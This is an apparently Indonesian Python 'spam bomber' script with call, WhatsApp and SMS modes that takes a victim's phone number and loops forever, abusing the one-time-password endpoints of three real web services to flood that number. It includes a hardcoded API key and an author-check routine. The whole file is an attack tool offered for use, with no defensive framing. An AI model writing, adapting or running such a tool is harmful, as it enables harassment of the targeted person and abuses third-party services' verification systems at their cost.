import requests, time, os, base64, sys

# ANSI Escape Codes for Colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"

# --- [ CLEAR TERMINAL ] --- #
def clear_terminal():
    if sys.platform.lower() == "win":
        os.system("cls")
    else:
        os.system("clear")

# --- [ BANNER ] --- #
def print_banner():
    banner = f"""
{BOLD}{GREEN}
 ███████╗██████╗  █████╗ ███╗   ███╗    ███████╗ ██████╗ ███████╗██████╗ ██████╗
 ██╔════╝██╔══██╗██╔══██╗████╗ ████║    ██╔════╝██╔═══██╗██╔════╝██╔══██╗██╔══██╗
 ███████╗██║  ██║███████║██╔████╔██║    █████╗  ██║   ██║█████╗  ██║  ██║██████╔╝
 ╚════██║██║  ██║██╔══██║██║╚██╔╝██║    ██╔══╝  ██║   ██║██╔══╝  ██║  ██║██╔══██╗
 ███████║██████╔╝██║  ██║██║ ╚═╝ ██║    ██║     ╚██████╔╝███████╗██████╔╝██║  ██║
 ╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝    ╚═╝      ╚═════╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝
 
                {CYAN}[ dev by : {author} ]{RESET}
    """
    print(banner)

# --- [ LOADING ANIMATION ] --- #
def loading_animation(text):
    for i in range(3):
        sys.stdout.write(f"\r{YELLOW}{text}{'.' * (i + 1)}{RESET}")
        sys.stdout.flush()
        time.sleep(0.2)  # Quick loading animation
    print()

# --- [ CHECK AUTHOR VALIDATION ] --- #
def check_author():
    encoded_author = "Um9jaG1hdCBCYXN1a2k="
    if base64.b64decode(encoded_author).decode('ascii') != author:
        print(RED + "Author tidak valid!" + RESET)
        exit()

# --- [ SPAM FUNCTIONS ] --- #
def spam_call(nomor):
    global no
    try:
        date = {"number": nomor, "country_code": "+62", "type": "CITCALL"}
        ses.headers.update({"x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj", "Key": "Um9jaG1hdCBCYXN1a2k="})
        check_author()
        post = ses.post("https://beta.api.saturdays.com/api/v1/user/otp/send", data=date).json()
        if post.get("status") == "True":
            no += 1
            print(f"{GREEN}[{no}] Sukses spam call{RESET}")
        else:
            print(f"{RED}[*] Terkena limit call{RESET}")
        ses.cookies.clear()
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")

def spam_wa(nomor):
    global no
    try:
        date = {"accountType": "customers", "countryCode": "62", "medium": "whatsapp", "otpType": "register", "phoneNumber": nomor}
        ses.headers.update({"Key": "Um9jaG1hdCBCYXN1a2k="})
        check_author()
        post = ses.post("https://www.pinhome.id/api/pinaccount/request/otp", data=date).text
        if "Code" in post:
            no += 1
            print(f"{GREEN}[{no}] Sukses spam WA{RESET}")
        else:
            print(f"{RED}[*] Terkena limit WA{RESET}")
        ses.cookies.clear()
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")

def spam_sms(nomor):
    global no
    try:
        date = {"action": "send_user_otp", "resendc": "2", "user_phone": "62" + nomor}
        post = ses.post("https://infokost.id/wp-admin/admin-ajax.php", data=date).text
        if "ok" in post:
            no += 1
            print(f"{GREEN}[{no}] Sukses spam SMS{RESET}")
        ses.cookies.clear()
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")

# --- [ MAIN MENU ] --- #
def menu_utama():
    print_banner()
    print(f"{CYAN}[1] Mode Call Blast\n[2] WA Bombing\n[3] SMS Grenade\n[4] Ultimate Chaos\n{RESET}")
    pilihan = input(f"{CYAN}[*] Pilih Mode: {RESET}")
    print('-' * 40)
    nomor = input(f"{YELLOW}[*] Target Nomor: 0{RESET}")
    print('-' * 40)

    if pilihan == "1":
        print(f"{YELLOW}[!] Call Blast akan mengirim spam panggilan, maksimal 5X per hari per device.{RESET}")
        print('-' * 40)
        while True:
            loading_animation("Mengirim Call Blast")
            spam_call(nomor)
            time.sleep(1)
    elif pilihan == "2":
        print(f"{YELLOW}[!] WA Bombing tanpa batas, delay otomatis 1 detik.{RESET}")
        print('-' * 40)
        while True:
            loading_animation("Mengirim WA Bombing")
            spam_wa(nomor)
            time.sleep(1)
    elif pilihan == "3":
        print(f"{YELLOW}[!] SMS Grenade akan mengirim spam SMS tanpa batas.{RESET}")
        print('-' * 40)
        while True:
            loading_animation("Mengirim SMS Grenade")
            spam_sms(nomor)
            time.sleep(1)
    elif pilihan == "4":
        print(f"{YELLOW}[!] Ultimate Chaos mengirim spam call, WA, dan 30 SMS dalam satu putaran.{RESET}")
        print('-' * 40)
        while True:
            loading_animation("Mengirim Ultimate Chaos")
            spam_call(nomor)
            spam_wa(nomor)
            for _ in range(15):
                spam_sms(nomor)
            time.sleep(1)
    else:
        print(f"{RED}[*] Pilihan tidak valid!{RESET}")

if __name__ == "__main__":
    ses = requests.Session()
    no = 0
    author = "Dapin"
    menu_utama()
